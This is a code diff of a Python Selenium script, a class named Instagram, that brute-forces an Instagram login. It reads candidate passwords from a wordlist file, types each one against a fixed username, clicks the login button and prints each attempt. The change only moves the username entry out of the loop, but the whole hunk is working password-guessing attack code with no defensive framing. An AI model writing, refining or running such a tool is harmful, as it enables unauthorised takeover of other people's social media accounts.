@@ -18,22 +18,20 @@ class Instagram:
             self.nameBlock = self.browser.find_element_by_name("username")
             self.passBlock = self.browser.find_element_by_name("password")
             self.loginButton = self.browser.find_element_by_xpath("//*[@id='loginForm']/div[1]/div[3]/button")
+            
+            self.nameBlock.send_keys(Keys.CONTROL + "a")
+            self.nameBlock.send_keys(Keys.DELETE)
+            self.nameBlock.send_keys(self.name)
 
             for password in open(self.password_path, "r"):
-                self.nameBlock.send_keys(Keys.CONTROL + "a")
-                self.nameBlock.send_keys(Keys.DELETE)
                 self.passBlock.send_keys(Keys.CONTROL + "a")
                 self.passBlock.send_keys(Keys.DELETE)
-                # cleared textbox
-
-                self.nameBlock.send_keys(self.name)
 
                 if len(password) >= 6:
                     self.passBlock.send_keys(password)
                 else:
                     print("This password is too short!\n", password)
                     continue
-                # wrote name and pass
 
                 print("Trying Password; ", password)
                 self.browser.execute_script("arguments[0].click();", self.loginButton)
